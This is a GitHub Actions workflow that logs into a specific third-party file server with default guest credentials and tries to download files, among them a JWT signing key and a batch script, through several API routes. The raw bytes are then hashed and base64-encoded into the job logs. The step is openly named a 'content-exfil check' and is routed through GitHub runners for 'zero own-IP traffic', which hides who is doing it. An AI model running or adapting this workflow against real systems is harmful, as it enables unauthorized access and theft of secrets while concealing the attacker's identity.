name: openlist-content-verify2
on:
  workflow_dispatch:
jobs:
  verify2:
    runs-on: ubuntu-latest
    steps:
      - name: final content-exfil check via /api/fs/get raw_url + /d/ route (GitHub relay, zero own-IP traffic)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          echo "=== [1] login guest ==="
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          AUTH="Authorization: ${TOKEN}"
          test_path () {
            local f="$1"; local mode="$2"; local hdr=(); [ "$mode" = "auth" ] && hdr=(-H "$AUTH")
            echo "######## $mode /api/fs/get  $f"
            curl -skS -m 30 -X POST "$B/api/fs/get" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$f\"}" -w "\nHTTP %{http_code}\n" | head -c 2000
            echo
            echo "######## $mode /api/fs/raw  $f"
            curl -skS -m 30 -X POST "$B/api/fs/raw" "${hdr[@]}" -H "Content-Type: application/json" -d "{\"path\":\"$f\"}" -o /tmp/r.bin -w "HTTP %{http_code} bytes=$(wc -c < /tmp/r.bin 2>/dev/null)\n"
            echo "  sha=$(sha256sum /tmp/r.bin 2>/dev/null | cut -c1-16) b64=$(head -c 200 /tmp/r.bin 2>/dev/null | base64 -w0)"
            ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote('$f'))" 2>/dev/null)
            echo "######## $mode GET /d/$ENC"
            curl -skS -m 30 -H "${hdr[@]}" "$B/d/$ENC" -o /tmp/d.bin -w "HTTP %{http_code} bytes=$(wc -c < /tmp/d.bin 2>/dev/null)\n"
            echo "  sha=$(sha256sum /tmp/d.bin 2>/dev/null | cut -c1-16) b64=$(head -c 200 /tmp/d.bin 2>/dev/null | base64 -w0)"
          }
          P1="/Artex  直装包  渗透网站专用/jwt.key"
          P2="/Artex  直装包  渗透网站专用/artex-menu.bat"
          P3="/Artex  直装包  渗透网站专用/data"
          echo "===== TEST P1 jwt.key (32B) ====="
          test_path "$P1" "noauth"
          test_path "$P1" "auth"
          echo "===== TEST P2 artex-menu.bat (1309B) ====="
          test_path "$P2" "noauth"
          test_path "$P2" "auth"
          echo "===== TEST P3 data (dir) ====="
          test_path "$P3" "noauth"
          test_path "$P3" "auth"
          echo "=== VERIFY2 DONE ==="
